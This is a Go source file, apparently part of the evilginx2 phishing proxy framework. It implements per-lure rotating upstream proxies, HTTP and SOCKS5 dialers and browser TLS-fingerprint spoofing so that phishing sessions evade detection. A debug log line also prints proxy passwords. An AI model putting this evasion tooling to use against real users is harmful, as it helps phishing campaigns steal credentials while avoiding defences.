package core

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/elazarl/goproxy"
	http_dialer "github.com/mwitkow/go-http-dialer"
	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/proxy"

	"github.com/kgretzky/evilginx2/log"
)

// ProxyPool dispenses proxies from a lure's proxy pool in round-robin order.
// Multiple sessions created from the same lure share the pool, but each session
// is bound to the proxy it was assigned at landing time.
type ProxyPool struct {
	mu        sync.Mutex
	proxies   []*ProxyConfig
	nextIndex int
}

// Pick returns the next proxy in round-robin order. It is safe for concurrent
// use and guarantees that, over time, each enabled proxy is selected equally
// often on average.
func (pool *ProxyPool) Pick() *ProxyConfig {
	pool.mu.Lock()
	defer pool.mu.Unlock()

	if len(pool.proxies) == 0 {
		return nil
	}
	pc := pool.proxies[pool.nextIndex]
	pool.nextIndex = (pool.nextIndex + 1) % len(pool.proxies)
	return pc
}

// getProxyPool returns the runtime proxy pool for a lure, creating it on first
// use from the lure's ProxyPool configuration. Only enabled proxies are kept.
func (p *HttpProxy) getProxyPool(l *Lure) *ProxyPool {
	if l == nil || len(l.ProxyPool) == 0 {
		return nil
	}

	var enabled []*ProxyConfig
	for _, pc := range l.ProxyPool {
		if pc != nil && pc.Enabled {
			enabled = append(enabled, pc)
		}
	}
	if len(enabled) == 0 {
		return nil
	}

	p.proxyPoolsMtx.Lock()
	defer p.proxyPoolsMtx.Unlock()

	pool, ok := p.proxyPools[l.Id]
	if ok && len(pool.proxies) == len(enabled) {
		return pool
	}

	pool = &ProxyPool{proxies: enabled}
	p.proxyPools[l.Id] = pool
	return pool
}

// createProxyDialer builds a network dialer from a ProxyConfig. The returned
// dialer has the signature expected by http.Transport.Dial.
func createProxyDialer(pc *ProxyConfig) func(network, addr string) (net.Conn, error) {
	if pc == nil || !pc.Enabled {
		return nil
	}

	ptype := strings.ToLower(pc.Type)
	u := url.URL{
		Scheme: ptype,
		Host:   net.JoinHostPort(pc.Address, strconv.Itoa(pc.Port)),
	}

	switch ptype {
	case "http", "https":
		var dproxy *http_dialer.HttpTunnel
		if pc.Username != "" {
			dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(pc.Username, pc.Password)))
		} else {
			dproxy = http_dialer.New(&u)
		}
		return dproxy.Dial
	case "socks5", "socks5h":
		if pc.Username != "" {
			u.User = url.UserPassword(pc.Username, pc.Password)
		}
		dproxy, err := proxy.FromURL(&u, proxy.Direct)
		if err != nil {
			log.Error("proxy: failed to create socks dialer: %v", err)
			return nil
		}
		return dproxy.Dial
	default:
		log.Error("proxy: unsupported proxy type: %s", pc.Type)
		return nil
	}
}

// proxyConfigKey returns a stable string key for a proxy configuration. It is
// used for transport caching.
func proxyConfigKey(pc *ProxyConfig) string {
	if pc == nil {
		return ""
	}
	return fmt.Sprintf("%s://%s:%s@%s:%d", pc.Type, pc.Username, pc.Password, pc.Address, pc.Port)
}

// getSessionRoundTripper returns a goproxy RoundTripper for a session that has
// an AssignedProxy. The transport is cached per proxy config and JA3 fingerprint
// so multiple sessions sharing the same proxy reuse connections efficiently.
func (p *HttpProxy) getSessionRoundTripper(s *Session, userAgent string) goproxy.RoundTripper {
	if s == nil || s.AssignedProxy == nil {
		return nil
	}

	fpName := strings.ToLower(strings.TrimSpace(p.cfg.GetJa3Fingerprint()))
	var helloID utls.ClientHelloID
	useUTLS := false

	switch fpName {
	case "", "none", "default":
		useUTLS = false
	case "auto":
		useUTLS = true
		helloID = ParseUserAgentFingerprint(userAgent)
	default:
		useUTLS = true
		var err error
		helloID, err = ParseUTLSFingerprint(fpName)
		if err != nil {
			helloID = utls.HelloChrome_Auto
		}
	}

	var cacheKey string
	if useUTLS {
		cacheKey = proxyConfigKey(s.AssignedProxy) + ":" + GetFingerprintName(helloID)
	} else {
		cacheKey = proxyConfigKey(s.AssignedProxy) + ":none"
	}

	p.lureProxyTransportsMtx.RLock()
	tr, ok := p.lureProxyTransports[cacheKey]
	p.lureProxyTransportsMtx.RUnlock()
	if ok {
		return goproxy.RoundTripperFunc(func(r *http.Request, _ *goproxy.ProxyCtx) (*http.Response, error) {
			return tr.RoundTrip(r)
		})
	}

	baseDial := createProxyDialer(s.AssignedProxy)
	if baseDial == nil {
		log.Error("proxy: failed to create dialer for session %s", s.Id)
		return nil
	}
	baseDialCtx := func(ctx context.Context, network, addr string) (net.Conn, error) {
		return baseDial(network, addr)
	}

	if useUTLS {
		tr = NewUTLSTransport(helloID, baseDialCtx)
	} else {
		tr = &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 20,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
			DialContext:         baseDialCtx,
		}
	}

	p.lureProxyTransportsMtx.Lock()
	p.lureProxyTransports[cacheKey] = tr
	p.lureProxyTransportsMtx.Unlock()

	log.Debug("proxy: created transport for session %s using %s", s.Id, cacheKey)
	return goproxy.RoundTripperFunc(func(r *http.Request, _ *goproxy.ProxyCtx) (*http.Response, error) {
		return tr.RoundTrip(r)
	})
}

// ParseProxyPoolString parses a proxy given in the common shorthand format:
//
//	[type://]host:port[:username[:password]]
//
// If no scheme is provided, the proxy type defaults to "http". Supported
// schemes are http, https, socks5 and socks5h.
func ParseProxyPoolString(s string) (*ProxyConfig, error) {
	if s == "" {
		return nil, fmt.Errorf("empty proxy string")
	}

	ptype := "http"
	if idx := strings.Index(s, "://"); idx != -1 {
		ptype = strings.ToLower(s[:idx])
		s = s[idx+3:]
	}

	if ptype != "http" && ptype != "https" && ptype != "socks5" && ptype != "socks5h" {
		return nil, fmt.Errorf("unsupported proxy type: %s", ptype)
	}

	parts := strings.SplitN(s, ":", 4)
	if len(parts) < 2 {
		return nil, fmt.Errorf("proxy string must be host:port[:username[:password]]")
	}

	port, err := strconv.Atoi(parts[1])
	if err != nil || port <= 0 || port > 65535 {
		return nil, fmt.Errorf("invalid port: %s", parts[1])
	}

	pc := &ProxyConfig{
		Type:    ptype,
		Address: parts[0],
		Port:    port,
		Enabled: true,
	}
	if len(parts) >= 3 {
		pc.Username = parts[2]
	}
	if len(parts) >= 4 {
		pc.Password = parts[3]
	}
	return pc, nil
}
